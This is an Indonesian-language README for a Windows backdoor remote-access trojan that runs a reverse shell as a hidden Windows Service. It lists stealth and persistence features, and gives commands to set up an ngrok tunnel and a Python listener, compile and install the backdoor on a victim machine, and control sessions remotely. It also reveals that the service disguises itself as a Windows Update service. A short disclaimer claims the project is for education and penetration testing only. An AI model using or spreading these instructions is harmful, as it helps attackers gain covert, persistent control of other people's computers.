# Backdoor Remote Access (RAT)

🚀 **Backdoor Remote Access (RAT)** adalah proyek yang memungkinkan remote control komputer target melalui reverse shell yang berjalan sebagai Windows Service.

## 📌 **Fitur Utama**
✅ Reverse shell otomatis saat target online  
✅ Persistence (berjalan otomatis setelah restart)  
✅ Berjalan sebagai Windows Service (tidak terlihat di Task Manager biasa)  
✅ Stealth Mode (tanpa jendela console)  
✅ Menggunakan WinSock untuk koneksi jaringan  

---

## 📥 **Instalasi & Penggunaan**

### 1️⃣ **Setup Server (Attacker)**
1. Jalankan **Ngrok** untuk mendapatkan IP public:
   ```sh
   ngrok tcp 4444
   ```
2. Jalankan listener di server:
   ```sh
   python attacker.py
   ```
3. Server siap menerima koneksi dari target.

---

### 2️⃣ **Setup Target (Victim)**
1. **Compile `backdoor.cpp` menjadi `backdoor.exe`**:
   ```sh
   g++ backdoor.cpp -o backdoor.exe -mwindows -lws2_32 -lwininet
   ```
2. **Jalankan `backdoor.exe` di target sebagai service**:
   ```sh
   backdoor.exe install
   ```
3. **Sekarang, backdoor akan berjalan otomatis setiap kali target menyala.**

---

### 3️⃣ **Mengontrol Target dari Server**
1. **Cek sesi yang aktif**:
   ```sh
   sessions -l
   ```
2. **Masuk ke sesi target**:
   ```sh
   sessions -i 1
   ```
3. **Jalankan perintah di target (contoh)**:
   ```sh
   session-1> whoami
   session-1> dir C:\Users
   ```

---

## 🛠 **Cara Menghapus Backdoor dari Target**
Jika ingin menghapus backdoor dari sistem target:
```sh
sc stop WindowsUpdateSvc
sc delete WindowsUpdateSvc
del C:\Windows\System32\winupdate.exe
```

---

## ⚠️ **Disclaimer**
💀 **Proyek ini hanya untuk tujuan edukasi & penetration testing!**  
⚠️ **Jangan digunakan untuk aktivitas ilegal!** Penggunaan tanpa izin bisa melanggar hukum di berbagai negara.  

